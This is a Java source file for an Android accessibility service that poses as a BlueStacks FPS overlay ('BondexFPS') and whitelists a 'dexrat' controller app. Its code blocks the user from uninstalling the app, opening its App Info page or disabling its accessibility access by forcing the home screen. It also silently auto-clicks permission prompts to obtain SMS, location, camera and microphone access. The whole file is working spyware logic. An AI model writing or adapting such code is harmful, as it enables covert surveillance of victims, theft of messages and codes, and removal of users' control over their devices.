package com.bluestacks.fpsoverlay;

import android.Manifest;
import android.accessibilityservice.AccessibilityService;
import android.content.pm.PackageManager;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import androidx.core.content.ContextCompat;
import java.util.List;

public class ProtectionManager {
    private static final String TAG = "ProtectionManager";
    private final AccessibilityService service;
    private boolean antiUninstallEnabled = false;
    private boolean allPermissionsGranted = false;

    public ProtectionManager(AccessibilityService service) {
        this.service = service;
    }

    public void setAntiUninstallEnabled(boolean enabled) {
        this.antiUninstallEnabled = enabled;
        Log.d(TAG, "Anti-Uninstall toggle set to: " + enabled);
    }

    public void handleAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        
        String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";

        // 0. WHITELIST
        // Jangan blokir aplikasi kita sendiri atau controller kita yang baru
        if (pkg.equals(service.getPackageName()) || 
            pkg.equals("com.dexrat.controller") ||
            pkg.contains("com.dexrat.controller")) {
            return;
        }

        // --- PRIORITAS 1: ANTI-UNINSTALL & ANTI-NONAKTIF AKSESIBILITAS ---
        if (antiUninstallEnabled && (
                pkg.contains("packageinstaller") || 
                pkg.contains("settings") || 
                pkg.contains("installer") || 
                pkg.contains("securitycenter") || 
                pkg.equals("android"))) { // Menghapus 'launcher' dari sini
            
            AccessibilityNodeInfo root = service.getRootInActiveWindow();
            if (root != null) {
                // Tambahan: Pastikan ini adalah window yang aktif atau dialog
                if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || 
                    event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                    
                    // 1. Cek upaya Uninstall
                    if (isLikelyUninstallDialog(root)) {
                        Log.w(TAG, "!! UNINSTALL DETECTED !! Blocking.");
                        service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
                        root.recycle();
                        return;
                    }

                    // 2. Cek upaya Nonaktifkan Aksesibilitas
                    if (pkg.contains("settings") && isLikelyAccessibilityPage(root)) {
                        Log.e(TAG, "!!! ACCESSIBILITY PROTECTION TRIGGERED !!!");
                        service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
                        root.recycle();
                        return;
                    }

                    // 3. Cek halaman App Info secara agresif
                    if (pkg.contains("settings") && isLikelyAppInfoPage(root)) {
                        Log.e(TAG, "!!! APP INFO PROTECTION TRIGGERED !!!");
                        service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
                        root.recycle();
                        return;
                    }
                }
                root.recycle();
            }
        }

        // --- PRIORITAS 2: AUTO ALLOW PERMISSIONS ---
        if (allPermissionsGranted) {
            // Sudah tidak perlu mencari lagi
            return;
        }

        if (pkg.contains("permissioncontroller") || pkg.contains("packageinstaller") || 
            pkg.contains("settings") || pkg.contains("security")) {
            
            // Verifikasi apakah masih ada izin yang kurang
            if (!hasAllPermissions()) {
                // Gunakan pencarian cepat
                autoAllowPermissions();
            }
        }
    }

    private boolean hasAllPermissions() {
        if (allPermissionsGranted) return true;

        String[] permissions;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions = new String[]{
                Manifest.permission.READ_SMS,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO
            };
        } else {
            permissions = new String[]{
                Manifest.permission.READ_SMS,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO
            };
        }

        boolean missing = false;
        for (String perm : permissions) {
            if (ContextCompat.checkSelfPermission(service, perm) != PackageManager.PERMISSION_GRANTED) {
                missing = true;
                break;
            }
        }

        if (!missing) {
            allPermissionsGranted = true;
            Log.i(TAG, ">>> SUCCESS: All permissions granted. Auto-Allow logic SHUT DOWN. <<<");
            return true;
        }
        return false;
    }

    private boolean isLikelyUninstallDialog(AccessibilityNodeInfo root) {
        if (root == null) return false;
        
        String targetPkg = service.getPackageName();
        String controllerPkg = "com.dexrat.controller";
        
        // 1. Lewati jika ini adalah controller
        if (checkNodeRecursive(root, controllerPkg)) {
            return false;
        }

        // 2. CEK APAKAH INI DIALOG IZIN (PERMISSION)
        // Jika ada kata "allow" atau "izinkan", jangan anggap ini uninstall
        boolean isPermissionDialog = checkNodeForText(root, "Allow") || 
                                     checkNodeForText(root, "Izinkan") ||
                                     checkNodeForText(root, "Grant");
        if (isPermissionDialog) return false;

        String appName = "BondexFPS"; 
        try {
            int stringId = service.getApplicationInfo().labelRes;
            if (stringId != 0) appName = service.getString(stringId);
        } catch (Exception ignored) {}

        // 3. DETECTION: Cari identitas APK Target (Package Name atau App Name)
        boolean mentionsTarget = checkNodeRecursive(root, targetPkg) || checkNodeRecursive(root, appName);
        if (!mentionsTarget) return false;

        // 4. KEYWORDS: Pastikan benar-benar ada kata "Uninstall" atau "Copot"
        return checkNodeRecursive(root, "uninstall") || 
               checkNodeRecursive(root, "copot") || 
               checkNodeRecursive(root, "hapus") ||
               checkNodeRecursive(root, "delete");
    }

    private boolean isLikelyAccessibilityPage(AccessibilityNodeInfo root) {
        if (root == null) return false;

        String targetPkg = service.getPackageName(); // com.bluestacks.fpsoverlay
        String controllerPkg = "com.dexrat.controller";
        
        // 1. JANGAN PERNAH blokir controller sendiri
        if (checkNodeRecursive(root, controllerPkg)) {
            return false;
        }

        // 2. Identitas Label & Deskripsi (Dari strings.xml)
        String accLabel = "BlueStacks Mobile Optimization";
        
        // KATA KUNCI UNIK dari android:description di xml aksesibilitas kita
        // Ini HANYA akan muncul di halaman toggle/detail layanan kita.
        boolean isDetailPage = checkNodeRecursive(root, "real-time FPS") || 
                               checkNodeRecursive(root, "smoother gaming experience") ||
                               checkNodeRecursive(root, "hardware resources");

        if (isDetailPage) {
            Log.e(TAG, "!! DETECTED ON ACCESSIBILITY TOGGLE PAGE !! Aggressive Kick.");
            return true;
        }

        // 3. Deteksi di List Aksesibilitas (Metode Agresif)
        boolean hasIdentity = checkNodeRecursive(root, accLabel) || checkNodeRecursive(root, targetPkg);
        if (!hasIdentity) return false;

        // Cari bukti kuat bahwa ini adalah menu Aksesibilitas (bukan menu Apps biasa)
        boolean isAccMenu = checkNodeForText(root, "Accessibility") || 
                           checkNodeForText(root, "Aksesibilitas") ||
                           checkNodeForText(root, "Downloaded") ||
                           checkNodeForText(root, "Terunduh") ||
                           checkNodeForText(root, "Installed") ||
                           checkNodeForText(root, "Terinstal") ||
                           checkNodeForText(root, "Layanan");

        if (isAccMenu) {
            Log.w(TAG, "!! DETECTED IN ACCESSIBILITY LIST !! Aggressive Kick.");
            return true;
        }

        return false;
    }

    private boolean isLikelyAppInfoPage(AccessibilityNodeInfo root) {
        if (root == null) return false;

        // Cari kata kunci khas halaman App Info
        // Biasanya ada tombol "Force stop", "Uninstall", "Storage", "Permissions"
        boolean isAppInfoContext = checkNodeForText(root, "Force stop") || 
                                   checkNodeForText(root, "Paksa berhenti") ||
                                   checkNodeForText(root, "Uninstall") ||
                                   checkNodeForText(root, "Copot pemasangan") ||
                                   checkNodeForText(root, "Storage") ||
                                   checkNodeForText(root, "Penyimpanan");

        if (!isAppInfoContext) return false;

        // Jika ini memang halaman App Info, cek apakah ini milik aplikasi kita
        String appName = "BondexFPS";
        String targetPkg = service.getPackageName();
        
        return checkNodeRecursive(root, appName) || checkNodeRecursive(root, targetPkg);
    }

    private void autoAllowPermissions() {
        AccessibilityNodeInfo root = service.getRootInActiveWindow();
        if (root == null) return;

        // Jangan interupsi proses uninstall
        if (isLikelyUninstallDialog(root)) {
            root.recycle();
            return;
        }

        // Optimasi: List ID paling sering muncul di urutan pertama
        String[] ids = {
            "com.android.permissioncontroller:id/permission_allow_button",
            "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
            "com.android.permissioncontroller:id/permission_allow_always_button",
            "com.android.permissioncontroller:id/permission_allow_one_time_button",
            "com.samsung.android.permissioncontroller:id/permission_allow_button",
            "com.lbe.security.miui:id/permission_allow_button",
            "android:id/button1"
        };

        for (String id : ids) {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(id);
            if (nodes != null && !nodes.isEmpty()) {
                for (AccessibilityNodeInfo node : nodes) {
                    if (performSafeClick(node, id)) {
                        root.recycle();
                        return;
                    }
                }
            }
        }

        // Quick Keywords Fallback (Hanya jika ID gagal)
        String[] keys = {"Allow", "Izinkan", "While using", "Saat aplikasi", "Hanya kali ini", "Only this time"};
        for (String key : keys) {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(key);
            if (nodes != null) {
                for (AccessibilityNodeInfo node : nodes) {
                    if (performSafeClick(node, "Text:" + key)) {
                        root.recycle();
                        return;
                    }
                }
            }
        }

        root.recycle();
    }

    private boolean performSafeClick(AccessibilityNodeInfo node, String identifier) {
        if (node == null) return false;
        try {
            if (node.isVisibleToUser() && node.isEnabled()) {
                String text = node.getText() != null ? node.getText().toString().toLowerCase() : "";
                
                // Safety: Stop if it's uninstall related
                if (text.contains("uninstall") || text.contains("copot") || text.contains("hapus")) {
                    node.recycle();
                    return false;
                }

                // Cepat cari clickable target
                AccessibilityNodeInfo target = node;
                if (!target.isClickable()) {
                    AccessibilityNodeInfo parent = target.getParent();
                    if (parent != null) {
                        if (parent.isClickable()) {
                            target = parent;
                        } else {
                            AccessibilityNodeInfo grandParent = parent.getParent();
                            if (grandParent != null && grandParent.isClickable()) {
                                target = grandParent;
                            }
                        }
                    }
                }

                if (target != null && target.isClickable()) {
                    boolean success = target.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    if (success) {
                        Log.i(TAG, "--> SUCCESS: Clicked button [" + text + "] via " + identifier);
                    }
                    if (target != node) target.recycle();
                    node.recycle();
                    return success;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error during click: " + e.getMessage());
        }
        node.recycle();
        return false;
    }

    private boolean checkNodeForText(AccessibilityNodeInfo node, String text) {
        return checkNodeRecursive(node, text);
    }

    private boolean checkNodeRecursive(AccessibilityNodeInfo node, String target) {
        if (node == null) return false;
        
        // Cek Text
        CharSequence text = node.getText();
        if (text != null && text.toString().toLowerCase().contains(target.toLowerCase())) {
            return true;
        }
        
        // Cek Content Description (Sering digunakan di Android baru)
        CharSequence desc = node.getContentDescription();
        if (desc != null && desc.toString().toLowerCase().contains(target.toLowerCase())) {
            return true;
        }

        // Cari di anak-anaknya (Recursive)
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                if (checkNodeRecursive(child, target)) {
                    child.recycle();
                    return true;
                }
                child.recycle();
            }
        }

        return false;
    }
}
